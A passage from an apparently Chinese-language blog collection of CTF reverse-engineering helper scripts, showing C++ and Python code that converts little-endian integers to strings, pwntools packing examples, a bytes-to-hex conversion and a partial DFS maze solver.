数据转换为正序</strong>，并将结果存放到 string字符串 buffer 中</li><li>如果 int 型数据的十六进制字符串位数不够，会自动进行补齐</li></ol></li><li><p>参数：</p></li></ul><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td><code>num</code></td><td>小端序存放的 <code>int</code> 型数</td></tr><tr><td><code>width_num</code></td><td>小端序存放的 <code>int</code> 型数据对应的 十六进制数 除去 <code>&#39;0x&#39;</code> 后的长度</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> width_num<span class="token punctuation">)</span><span class="token punctuation">:</span>      hex_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token comment"># 将int数据转换为十六进制的字符串  </span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span> <span class="token operator">!=</span> width_num <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>          hex_str <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>width_num <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 位数不足width的用0凑齐  </span>    <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 用于存放生成的字符串  </span>    index <span class="token operator">=</span> width_num      <span class="token keyword">while</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>          tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span>index<span class="token punctuation">:</span> index<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 每两位string转换为十六进制int型数据  </span>        <span class="token builtin">buffer</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>  <span class="token comment"># 将int型作为char存入buffer  </span>        index <span class="token operator">-=</span> <span class="token number">2</span>      <span class="token keyword">return</span> <span class="token builtin">buffer</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：int 型 <code>num = 0x7265667463</code>，num 长度 <code>width_num = 10</code></p><p>调用：<code>little_endian(num, 10)</code></p><p>输出结果：<code>ctfer</code>（由 0x63, 0x74, 0x66, 0x65, 0x72 得来）</p></blockquote><hr><h2 id="Python-版-Pwntools-工具"><a href="#Python-版-Pwntools-工具" class="headerlink" title="Python 版 Pwntools 工具"></a>Python 版 Pwntools 工具</h2><blockquote><p>做过 PWN 的应该都比较熟悉了，直接利用 Pwntools 工具来实现，方便快捷</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>    str1 <span class="token operator">=</span> <span class="token number">0x67616C66</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>p32<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p32<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>str2 <span class="token operator">=</span> <span class="token number">0x7265667463</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输出结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">b<span class="token string">'flag'</span>  flagb<span class="token string">'ctfer\x00\x00\x00'</span>  ctfer   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><hr><h1 id="小端序-int-型-gt-逆向-int-amp-char-型数组"><a href="#小端序-int-型-gt-逆向-int-amp-char-型数组" class="headerlink" title="小端序 int 型 -&gt; 逆向 int &amp; char 型数组"></a>小端序 int 型 -&gt; 逆向 int &amp; char 型数组</h1><h2 id="C-版-3"><a href="#C-版-3" class="headerlink" title="C++ 版"></a>C++ 版</h2><ul><li><p><strong>特点</strong>  </p><ol><li><strong>将小端序存放的 int型 数据转换为正序</strong>，并将结果存放到 int型 的 buffer数组 中 </li><li><mark>若 num 位数超长，将类型改为 <em>__int64</em></mark></li><li><mark>若要保存到 <em>char</em> 数组，直接将 <em>int buffer</em> 改为 <em>char buffer</em> 即可</mark></li></ol></li><li><p><strong>参数</strong></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>num</code></td><td align="left">小端序存放的 <code>int</code> 型数据</td></tr><tr><td align="left"><code>width_num</code></td><td align="left">小端序存放的 <code>int</code> 型数据对应的 十六进制数 去掉 <code>&#39;0x&#39;</code> 后的长度<br></td></tr><tr><td align="left"><code>buffer</code></td><td align="left">用来保存处理结果的 <code>int</code> 型 数组 <code>buffer[]</code>，<code>buffer[]</code> 是 <code>num</code> 的逆向顺序</td></tr><tr><td align="left"><code>buffer_length</code></td><td align="left"><code>buffer[]</code> 的长度，可根据 <code>width_num / 2 </code>得出</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">void</span> <span class="token function">little_endian</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width_num<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token keyword">int</span> buffer_length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流  </span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符  </span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出  </span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>width_num <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width_num <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0  </span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并  </span>    <span class="token punctuation">&#125;</span>      std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width_num<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位  </span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> index <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> index <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">int</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数  </span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 将2长度的字符串转换为十进制数，存放到sum  </span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f  </span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>              <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F  </span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>              <span class="token keyword">else</span>    <span class="token comment">// 处理0-9  </span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>              sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>              index<span class="token operator">++</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          index <span class="token operator">=</span> index <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>   <span class="token comment">// 因为前面修改了index，后面还要用index控制循环，所以这里将其还原  </span>        buffer<span class="token punctuation">[</span>buffer_length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> sum<span class="token punctuation">;</span>  <span class="token comment">// 将十进制数sum逆向存储到 buffer[]</span>        buffer_length<span class="token operator">--</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：int 型 <code>num = 0x65766F6C</code>，num 长度 <code>width_num = 8</code>，int 型数组 <code>buffer[10] = &#123;0&#125;</code>，buffer 长度 <code>buffer_length = 4</code></p><p>调用：<code>little_endian(num, 8, buffer, 4)</code></p><p>输出结果：<code>[108, 111, 118, 101, 0, 0, 0, 0, 0, 0]</code>（由 0x6C, 0x6F, 0x76, 0x65 得来）</p></blockquote><hr><h2 id="Python-版-4"><a href="#Python-版-4" class="headerlink" title="Python 版"></a>Python 版</h2><ul><li><p><strong>特点</strong></p><ol><li><strong>将小端序存放的 int 型 数据转换为正序</strong>，并将结果存放到列表 buffer 中</li><li>如果 int 型数据的十六进制字符串位数不够，会自动进行补齐</li></ol></li><li><p>参数：</p></li></ul><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td><code>num</code></td><td>小端序存放的 <code>int</code> 型数</td></tr><tr><td><code>width_num</code></td><td>小端序存放的 <code>int</code> 型数据对应的 十六进制数 除去 <code>&#39;0x&#39;</code> 后的长度</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> width_num<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存放结果的列表  </span>    hex_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token comment"># 将int数据转换为十六进制的字符串  </span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span> <span class="token operator">!=</span> width_num <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>          hex_str <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>width_num <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> hex_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 位数不足width的用0凑齐  </span>    index <span class="token operator">=</span> width_num      <span class="token keyword">while</span> index <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>          tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span>index<span class="token punctuation">:</span> index <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 每两位string转换为十六进制int型数据  </span>        <span class="token builtin">buffer</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将int型作为char存入buffer  </span>        index <span class="token operator">-=</span> <span class="token number">2</span>      <span class="token keyword">return</span> <span class="token builtin">buffer</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输入信息：int 型 <code>num = 0x7265667463</code>，num 长度 <code>width_num = 10</code></p><p>调用：<code>little_endian(num, 10)</code></p><p>输出结果：<code>[&#39;c&#39;, &#39;t&#39;, &#39;f&#39;, &#39;e&#39;, &#39;r&#39;]</code>（由 0x63, 0x74, 0x66, 0x65, 0x72 得来）</p></blockquote><hr><h2 id="Python-版-Pwntools-工具-1"><a href="#Python-版-Pwntools-工具-1" class="headerlink" title="Python 版 Pwntools 工具"></a>Python 版 Pwntools 工具</h2><blockquote><p>做过 PWN 的应该都比较熟悉了，直接利用 Pwntools 工具来实现，方便快捷</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>    str1 <span class="token operator">=</span> <span class="token number">0x67616C66</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>p32<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p32<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    str2 <span class="token operator">=</span> <span class="token number">0x7265667463</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输出结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">b<span class="token string">'flag'</span>  <span class="token punctuation">[</span><span class="token string">'f'</span>, <span class="token string">'l'</span>, <span class="token string">'a'</span>, <span class="token string">'g'</span><span class="token punctuation">]</span>b<span class="token string">'ctfer\x00\x00\x00'</span>  <span class="token punctuation">[</span><span class="token string">'c'</span>, <span class="token string">'t'</span>, <span class="token string">'f'</span>, <span class="token string">'e'</span>, <span class="token string">'r'</span>, <span class="token string">'\x00'</span>, <span class="token string">'\x00'</span>, <span class="token string">'\x00'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><hr><h1 id="bytes-型-gt-十六进制字符串"><a href="#bytes-型-gt-十六进制字符串" class="headerlink" title="bytes 型 -&gt; 十六进制字符串"></a>bytes 型 -&gt; 十六进制字符串</h1><h2 id="Python-版-5"><a href="#Python-版-5" class="headerlink" title="Python 版"></a>Python 版</h2><ul><li><p>特点</p><ol><li>bytes 型中有些字符不可打印，会用 <code>&#39;\xf3&#39;</code> 之类的来表示，与可打印字符混在一起很不好看，可以将其全部转为 16 进制的字符串</li></ol></li><li><p>代码</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binasciienc_byte <span class="token operator">=</span> <span class="token string">b'\x91E2\xf3\xc0g~D\xc5\x16\x9a\to\xfc\xcb\xd7'</span>enc_str <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>enc_byte<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc_str<span class="token punctuation">)</span><span class="token comment"># b'914532f3c0677e44c5169a096ffccbd7'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="走迷宫"><a href="#走迷宫" class="headerlink" title="走迷宫"></a>走迷宫</h1><h2 id="Python-版-6"><a href="#Python-版-6" class="headerlink" title="Python 版"></a>Python 版</h2><ul><li><p><strong>特点</strong></p><ol><li>给出迷宫，起始位置和终点位置，输出走迷宫的路径</li><li>迷宫中 0 代表路，1 代表墙壁</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">maze <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    usedmap <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment"># 生成与迷宫相同规格的全0列表，用来记录已经走过的位置  </span>  sti <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 初始位置的横坐标  </span>stj <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 初始位置的纵坐标  </span>edi <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment"># 终点位置的横坐标  </span>edj <span class="token operator">=</span> <span class="token number">5</span>  <span class="token comment"># 终点位置的纵坐标  </span>flag <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 走迷宫  </span>    <span class="token keyword">global</span> flag      <span class="token keyword">if</span> x <span class="token operator">==</span> edi <span class="token keyword">and</span> y <span class="token operator">==</span> edj<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>          <span class="token keyword">return</span>      <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往下走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'s'</span>  <span class="token comment"># 向下走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往上走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'w'</span>  <span class="token comment"># 向上走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token 